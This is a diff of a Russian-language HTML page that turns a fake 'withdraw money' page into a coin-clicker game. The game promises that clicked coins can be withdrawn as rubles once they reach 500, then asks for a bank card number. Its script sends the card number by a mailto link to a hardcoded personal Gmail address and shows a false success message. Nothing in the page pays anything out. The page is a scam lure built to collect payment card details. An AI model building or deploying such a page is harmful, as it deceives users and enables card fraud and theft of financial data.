@@ -3,25 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Вывод денег</title>
+    <title>Кликер с выводом денег</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Arial', sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
             min-height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
             padding: 20px;
         }
         
         .container {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            width: 90%;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            margin-top: 0;
+            font-size: 2.5rem;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .coin-counter {
+            font-size: 3rem;
+            margin: 20px 0;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+        
+        .coin {
+            font-size: 4rem;
+            margin: 10px 0;
+            cursor: pointer;
+            transition: transform 0.1s;
+            user-select: none;
+        }
+        
+        .coin:active {
+            transform: scale(0.9);
+        }
+        
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        button {
+            background: linear-gradient(to right, #ff8a00, #da1b60);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn-withdraw {
+            background: linear-gradient(to right, #27ae60, #219653);
+        }
+        
+        .stats {
+            margin-top: 20px;
+            font-size: 1.1rem;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+        }
+        
+        .click-animation {
+            position: absolute;
+            font-size: 2rem;
+            font-weight: bold;
+            color: gold;
+            pointer-events: none;
+            animation: floatUp 1s forwards;
+        }
+        
+        @keyframes floatUp {
+            0% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+        }
+        
+        /* Стили для формы вывода */
+        .withdraw-container {
             background-color: rgba(255, 255, 255, 0.95);
             border-radius: 15px;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
@@ -29,12 +125,8 @@
             max-width: 500px;
             padding: 30px;
             text-align: center;
-        }
-        
-        h1 {
             color: #2c3e50;
-            margin-bottom: 20px;
-            font-size: 28px;
+            display: none;
         }
         
         .balance {
@@ -51,49 +143,9 @@
             margin-bottom: 5px;
         }
         
-        .balance p {
-            color: #7f8c8d;
-            font-size: 14px;
-        }
-        
-        .btn {
-            background: linear-gradient(to right, #3498db, #2980b9);
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
-            margin: 20px 0;
-            width: 100%;
-            font-weight: bold;
-        }
-        
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.6);
-        }
-        
-        .btn:active {
-            transform: translateY(1px);
-        }
-
-        .btn-success {
-            background: linear-gradient(to right, #27ae60, #219653);
-        }
-        
         .form-container {
-            display: none;
             text-align: left;
             margin-top: 20px;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
         }
         
         .form-group {
@@ -113,13 +165,6 @@
             border: 1px solid #ddd;
             border-radius: 8px;
             font-size: 16px;
-            transition: border 0.3s;
-        }
-        
-        input:focus {
-            border-color: #3498db;
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
         }
         
         .card-input {
@@ -134,54 +179,38 @@
             padding: 15px;
             border-radius: 8px;
             margin-top: 20px;
-            text-align: center;
-            animation: fadeIn 0.5s ease;
         }
         
-        .info {
-            margin-top: 25px;
-            padding: 15px;
-            background-color: #e8f4fd;
-            border-radius: 8px;
-            font-size: 14px;
-            color: #2c3e50;
-        }
-        
-        .info h3 {
-            margin-bottom: 10px;
-            color: #3498db;
-        }
-        
-        .info ul {
-            text-align: left;
-            margin-left: 20px;
-        }
-        
-        .info li {
-            margin-bottom: 8px;
-        }
-
         .email-info {
             background: #e3f2fd;
             border: 1px solid #bbdefb;
             border-radius: 8px;
             padding: 15px;
             margin: 15px 0;
-            text-align: center;
-        }
-
-        .email-info h3 {
-            color: #1976d2;
-            margin-bottom: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <!-- Кликер -->
+    <div class="container" id="clickerContainer">
+        <h1>Кликер с монетами</h1>
+        <div class="coin-counter" id="coinCounter">0 монет</div>
+        <div class="coin" id="coin">🪙</div>
+        <div class="buttons">
+            <button class="btn-withdraw" id="withdrawBtn">Вывести монеты</button>
+        </div>
+        <div class="stats">
+            <p>Всего кликов: <span id="totalClicks">0</span></p>
+            <p>Монет за клик: <span id="coinsPerClick">1</span></p>
+        </div>
+    </div>
+
+    <!-- Форма вывода -->
+    <div class="withdraw-container" id="withdrawContainer">
         <h1>Вывод средств</h1>
         
         <div class="balance">
-            <h2>15 640 ₽</h2>
+            <h2 id="availableAmount">0 ₽</h2>
             <p>Доступно для вывода</p>
         </div>
 
@@ -189,20 +218,13 @@
             <h3>📧 Уведомления приходят на почту</h3>
         </div>
         
-        <button class="btn" id="withdrawBtn">💳 Вывести деньги</button>
-        
         <div class="form-container" id="withdrawForm">
             <div class="form-group">
                 <label for="cardNumber">Номер банковской карты</label>
                 <input type="text" id="cardNumber" class="card-input" placeholder="0000 0000 0000 0000" maxlength="19">
             </div>
             
-            <div class="form-group">
-                <label for="amount">Сумма для вывода</label>
-                <input type="text" id="amount" placeholder="Введите сумму в рублях">
-            </div>
-            
-            <button class="btn btn-success" id="submitBtn">📨 Отправить заявку</button>
+            <button class="btn btn-withdraw" id="submitBtn" style="width: 100%;">📨 Отправить заявку</button>
         </div>
         
         <div class="success-message" id="successMessage">
@@ -211,87 +233,136 @@
             <p>📬 Уведомление отправлено на почту</p>
         </div>
         
-        <div class="info">
-            <h3>Информация о выводе средств</h3>
-            <ul>
-                <li>Минимальная сумма для вывода: 500 ₽</li>
-                <li>Комиссия за вывод: 2% от суммы</li>
-                <li>Срок обработки заявки: до 24 часов</li>
-                <li>Поступление средств: 1-3 рабочих дня</li>
-            </ul>
-        </div>
+        <button class="btn" id="backBtn" style="margin-top: 20px;">← Назад к кликеру</button>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const withdrawBtn = document.getElementById('withdrawBtn');
-            const withdrawForm = document.getElementById('withdrawForm');
-            const submitBtn = document.getElementById('submitBtn');
-            const successMessage = document.getElementById('successMessage');
-            const cardNumberInput = document.getElementById('cardNumber');
-            const amountInput = document.getElementById('amount');
+        // Переменные игры
+        let coins = 0;
+        let totalClicks = 0;
+        let coinsPerClick = 1;
+        
+        // Элементы DOM
+        const coinCounter = document.getElementById('coinCounter');
+        const coin = document.getElementById('coin');
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const totalClicksElement = document.getElementById('totalClicks');
+        const coinsPerClickElement = document.getElementById('coinsPerClick');
+        const clickerContainer = document.getElementById('clickerContainer');
+        const withdrawContainer = document.getElementById('withdrawContainer');
+        const availableAmount = document.getElementById('availableAmount');
+        const cardNumberInput = document.getElementById('cardNumber');
+        const submitBtn = document.getElementById('submitBtn');
+        const successMessage = document.getElementById('successMessage');
+        const backBtn = document.getElementById('backBtn');
+        
+        // ВАША ПОЧТА
+        const YOUR_EMAIL = 'mironnelox2016@gmail.com';
+        
+        // Функция для обновления отображения монет
+        function updateCoinDisplay() {
+            coinCounter.textContent = `${coins} монет`;
+            availableAmount.textContent = `${coins} ₽`;
+        }
+        
+        // Функция для обработки клика по монете
+        function handleCoinClick() {
+            coins += coinsPerClick;
+            totalClicks++;
+            updateCoinDisplay();
+            totalClicksElement.textContent = totalClicks;
             
-            // ВАША ПОЧТА
-            const YOUR_EMAIL = 'mironnelox2016@gmail.com';
+            // Создание анимации клика
+            createClickAnimation();
+        }
+        
+        // Функция для создания анимации клика
+        function createClickAnimation() {
+            const animation = document.createElement('div');
+            animation.classList.add('click-animation');
+            animation.textContent = `+${coinsPerClick}`;
+            animation.style.left = `${event.clientX}px`;
+            animation.style.top = `${event.clientY}px`;
+            document.body.appendChild(animation);
             
-            // Обработчик для кнопки "Вывести деньги"
-            withdrawBtn.addEventListener('click', function() {
-                withdrawForm.style.display = 'block';
-                withdrawBtn.style.display = 'none';
-            });
-            
-            // Форматирование номера карты
-            cardNumberInput.addEventListener('input', function() {
-                let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-                let formattedValue = '';
-                
-                for (let i = 0; i < value.length; i++) {
-                    if (i > 0 && i % 4 === 0) {
-                        formattedValue += ' ';
-                    }
-                    formattedValue += value[i];
-                }
-                
-                this.value = formattedValue;
-            });
-            
-            // Обработчик для кнопки отправки
-            submitBtn.addEventListener('click', function() {
-                const cardNumber = cardNumberInput.value.trim();
-                const amount = amountInput.value.trim();
-                
-                if (!cardNumber || cardNumber.length < 19) {
-                    alert('❌ Пожалуйста, введите корректный номер карты');
-                    return;
-                }
-                
-                if (!amount || isNaN(amount) || parseFloat(amount) < 500) {
-                    alert('❌ Пожалуйста, введите сумму не менее 500 рублей');
-                    return;
-                }
-
-                // Отправляем на почту
-                sendEmail(cardNumber, amount, YOUR_EMAIL);
-
-                // Показываем сообщение об успехе
-                withdrawForm.style.display = 'none';
-                successMessage.style.display = 'block';
-            });
-
-            // Функция отправки email
-            function sendEmail(cardNumber, amount, email) {
-                const subject = 'НОВАЯ ЗАЯВКА НА ВЫВОД';
-                const body = `ЗАЯВКА НА ВЫВОД СРЕДСТВ:\n\n💳 Номер карты: ${cardNumber}\n💰 Сумма: ${amount}₽\n⏰ Время: ${new Date().toLocaleString()}\n\nТребуется обработка.`;
-                
-                // Открываем почтовый клиент с заполненными данными
-                const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-                window.location.href = mailtoLink;
-                
-                console.log('📧 Отправляем на почту:', email);
-                console.log('💳 Карта:', cardNumber);
-                console.log('💰 Сумма:', amount);
+            // Удаление анимации после завершения
+            setTimeout(() => {
+                animation.remove();
+            }, 1000);
+        }
+        
+        // Функция для перехода к выводу
+        function showWithdrawForm() {
+            if (coins < 500) {
+                alert('❌ Минимальная сумма для вывода: 500 монет');
+                return;
             }
+            clickerContainer.style.display = 'none';
+            withdrawContainer.style.display = 'block';
+            updateCoinDisplay();
+        }
+        
+        // Функция возврата к кликеру
+        function showClicker() {
+            withdrawContainer.style.display = 'none';
+            clickerContainer.style.display = 'block';
+            successMessage.style.display = 'none';
+        }
+        
+        // Функция отправки заявки
+        function handleWithdrawSubmit() {
+            const cardNumber = cardNumberInput.value.trim();
+            
+            if (!cardNumber || cardNumber.length < 19) {
+                alert('❌ Пожалуйста, введите корректный номер карты');
+                return;
+            }
+
+            // Отправляем на почту
+            sendEmail(cardNumber, coins, YOUR_EMAIL);
+
+            // Показываем сообщение об успехе
+            document.getElementById('withdrawForm').style.display = 'none';
+            successMessage.style.display = 'block';
+            
+            // Сбрасываем монеты после вывода
+            coins = 0;
+            updateCoinDisplay();
+        }
+
+        // Функция отправки email
+        function sendEmail(cardNumber, amount, email) {
+            const subject = 'НОВАЯ ЗАЯВКА НА ВЫВОД';
+            const body = `ЗАЯВКА НА ВЫВОД СРЕДСТВ:\n\n💳 Номер карты: ${cardNumber}\n💰 Сумма: ${amount}₽\n⏰ Время: ${new Date().toLocaleString()}\n\nТребуется обработка.`;
+            
+            // Открываем почтовый клиент с заполненными данными
+            const mailtoLink = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            window.location.href = mailtoLink;
+        }
+        
+        // Форматирование номера карты
+        cardNumberInput.addEventListener('input', function() {
+            let value = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            
+            this.value = formattedValue;
         });
+        
+        // Назначение обработчиков событий
+        coin.addEventListener('click', handleCoinClick);
+        withdrawBtn.addEventListener('click', showWithdrawForm);
+        submitBtn.addEventListener('click', handleWithdrawSubmit);
+        backBtn.addEventListener('click', showClicker);
+        
+        // Инициализация отображения
+        updateCoinDisplay();
     </script>
 </body>
 </html>
